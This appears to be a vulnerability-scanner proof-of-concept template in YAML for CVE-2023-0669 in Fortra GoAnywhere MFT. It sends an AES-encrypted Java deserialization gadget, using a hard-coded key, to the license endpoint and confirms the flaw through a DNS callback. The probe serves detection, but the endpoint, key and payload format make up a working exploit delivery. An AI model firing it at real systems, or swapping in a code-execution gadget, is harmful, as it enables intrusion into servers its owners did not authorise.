name: yaml-poc-fortra-goanywhere_managed_file_transfer-logical-CVE-2023-0669
binding: 914b0db7-0320-45dd-b8f8-d1b0b31654ea
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/171789/Goanywhere-Encryption-Helper-7.1.1-Remote-Code-Execution.html
        - https://attackerkb.com/topics/mg883Nbeva/cve-2023-0669/rapid7-analysis
        - https://duo.com/decipher/fortra-patches-actively-exploited-zero-day-in-goanywhere-mft
        - https://frycos.github.io/vulns4free/2023/02/06/goanywhere-forgotten.html
        - https://github.com/rapid7/metasploit-framework/pull/17607
        - https://infosec.exchange/@briankrebs/109795710941843934
        - https://my.goanywhere.com/webclient/ViewSecurityAdvisories.xhtml#zerodayfeb1
        - https://www.rapid7.com/blog/post/2023/02/03/exploitation-of-goanywhere-mft-zero-day-vulnerability/
    vulnerability:
        id: c1b384bd-2499-4e0d-834f-db11a1e88bca
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /goanywhere/lic/accept
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: bundle={{concat(url_encode(base64(aes_cbc(base64_decode(generate_java_gadget("dns", "http://{{reverse.url}}", "base64")), base64_decode("Dmmjg5tuz0Vkm4YfSicXG2aHDJVnpBROuvPVL9xAZMo="), base64_decode("QUVTL0NCQy9QS0NTNVBhZA==")))), '$2')}}
            follow_redirects: false
        expression: response.status == 500 && reverse.wait(5) && response.body.bcontains(b"GoAnywhere")
expression: r0()
